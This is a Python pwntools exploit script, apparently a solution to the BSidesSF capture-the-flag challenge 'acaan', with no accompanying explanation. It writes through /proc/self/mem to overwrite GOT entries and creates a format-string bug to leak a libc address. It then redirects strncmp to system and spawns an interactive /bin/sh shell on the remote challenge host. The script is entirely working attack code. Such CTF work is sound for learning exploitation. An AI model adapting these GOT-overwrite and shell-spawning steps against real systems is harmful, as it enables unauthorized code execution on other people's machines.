from pwn import *

context.binary = binary = ELF('./acaan', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

FILENAME = b'/proc/self/mem'

CLOSE_GOT = b'0x404030'
STRNCMP_GOT = b'0x404008'
EXIT_GOT = b'0x404070'

PUTS_GOT = p64(0x404010)
MAIN = p64(0x401206)
PRINTF_PLT = p64(0x401080)

#p = process()
#p = remote('172.17.0.2', 4113)
p = remote('acaan-d715d4a7.challenges.bsidessf.net', 4113)

# Get infinite loop
p.sendlineafter(b'Filename?\n', FILENAME)
p.sendlineafter(b'hex)?\n', CLOSE_GOT)
p.send(MAIN + b'\n.\n')

# Create FSB
p.sendlineafter(b'Filename?\n', FILENAME)
p.sendlineafter(b'hex)?\n', STRNCMP_GOT)
p.send(PRINTF_PLT + b'\n.\n')

# Leak LIBC
p.sendlineafter(b'Filename?\n', FILENAME)
p.sendlineafter(b'hex)?\n', b'%13$sAAA' + PUTS_GOT)
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols.puts
info(f'puts@LIBC: {hex(puts_leak)}')
info(f'LIBC: {hex(libc.address)}')
p.send(b'\n.\n')

# Overwrite strncmp@GOT with system@LIBC
p.sendlineafter(b'Filename?\n', FILENAME)
p.sendlineafter(b'hex)?\n', str(int(STRNCMP_GOT, 16)).encode())
p.send(p64(libc.symbols.system) + b'\n.\n')

# Execute system("/bin/sh")
p.sendlineafter(b'Filename?\n', b'PWNED')
p.sendlineafter(b'hex)?\n', b'/bin/sh')

print('*** SHELL ***')
p.interactive()
